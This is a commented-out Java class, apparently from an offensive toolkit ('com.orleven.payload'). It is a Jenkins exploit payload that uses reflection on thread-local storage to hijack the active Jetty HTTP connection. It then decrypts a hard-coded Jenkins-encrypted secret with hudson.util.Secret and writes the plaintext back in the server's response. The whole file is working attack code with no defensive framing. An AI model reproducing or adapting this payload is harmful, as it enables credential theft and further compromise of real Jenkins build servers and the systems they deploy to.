//package com.orleven.payload;
//
//public class x{
//    public x(){Class clazz = Thread.currentThread().getClass();java.lang.reflect.Field field = clazz.getDeclaredField("threadLocals");field.setAccessible(true);Object obj = field.get(Thread.currentThread());field = obj.getClass().getDeclaredField("table");field.setAccessible(true);obj = field.get(obj);Object[] obj_arr = (Object[]) obj;String cmd = "whoami";
//        for(int i = 0; i < obj_arr.length; i++){Object o = obj_arr[i];if(o == null) continue;field = o.getClass().getDeclaredField("value");field.setAccessible(true);obj = field.get(o);
//            if(obj != null && obj.getClass().getName().endsWith("AsyncHttpConnection")){Object connection = obj;java.lang.reflect.Method method = connection.getClass().getMethod("getRequest", null);obj = method.invoke(connection, null);method = obj.getClass().getMethod("getHeader", String.class);cmd = (String)method.invoke(obj, "cmd");
//                if(cmd != null && !cmd.isEmpty()){
//                    String res = hudson.util.Secret.fromString("{AQAAABAAAAAQ6YjsHDLSPv9tNE0uBKxgbaAZPWSyF5z9TkfWIy48Uik=}").getPlainText();
//                    method = connection.getClass().getMethod("getPrintWriter", String.class);
//                    java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, "utf-8");
//                    printWriter.println(res);
//                }
//                break;
//            }else if(obj != null && obj.getClass().getName().endsWith("HttpConnection")){java.lang.reflect.Method method = obj.getClass().getDeclaredMethod("getHttpChannel", null);Object httpChannel = method.invoke(obj, null);method = httpChannel.getClass().getMethod("getRequest", null);obj = method.invoke(httpChannel, null);method = obj.getClass().getMethod("getHeader", String.class);cmd = (String)method.invoke(obj, "cmd");
//                if(cmd != null && !cmd.isEmpty()){
//                    String res = hudson.util.Secret.fromString("{AQAAABAAAAAQ6YjsHDLSPv9tNE0uBKxgbaAZPWSyF5z9TkfWIy48Uik=}").getPlainText();
//                    method = httpChannel.getClass().getMethod("getResponse", null);
//                    obj = method.invoke(httpChannel, null);
//                    method = obj.getClass().getMethod("getWriter", null);
//                    java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj, null);
//                    printWriter.println(res);
//                }
//                break;
//            }
//        }
//    }
//}